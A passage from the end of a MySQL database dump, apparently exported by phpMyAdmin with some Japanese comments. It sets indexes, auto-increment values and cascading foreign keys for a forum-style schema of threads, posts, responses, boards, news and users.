-- Indexes for table `responses`
--
ALTER TABLE `responses`
  ADD PRIMARY KEY (`id`),
  ADD KEY `thread_id` (`thread_id`);

--
-- Indexes for table `threads`
--
ALTER TABLE `threads`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `thread_posts`
--
ALTER TABLE `thread_posts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `thread_id` (`thread_id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `boards`
--
ALTER TABLE `boards`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=158;
--
-- AUTO_INCREMENT for table `id`
--
ALTER TABLE `id`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `news`
--
ALTER TABLE `news`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=12;
--
-- AUTO_INCREMENT for table `responses`
--
ALTER TABLE `responses`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=151;
--
-- AUTO_INCREMENT for table `threads`
--
ALTER TABLE `threads`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=78;
--
-- AUTO_INCREMENT for table `thread_posts`
--
ALTER TABLE `thread_posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=124;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- ダンプしたテーブルの制約
--

--
-- テーブルの制約 `responses`
--
ALTER TABLE `responses`
  ADD CONSTRAINT `responses_ibfk_1` FOREIGN KEY (`thread_id`) REFERENCES `threads` (`id`) ON DELETE CASCADE;

--
-- テーブルの制約 `thread_posts`
--
ALTER TABLE `thread_posts`
  ADD CONSTRAINT `thread_posts_ibfk_1` FOREIGN KEY (`thread_id`) REFERENCES `threads` (`id`) ON DELETE CASCADE;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
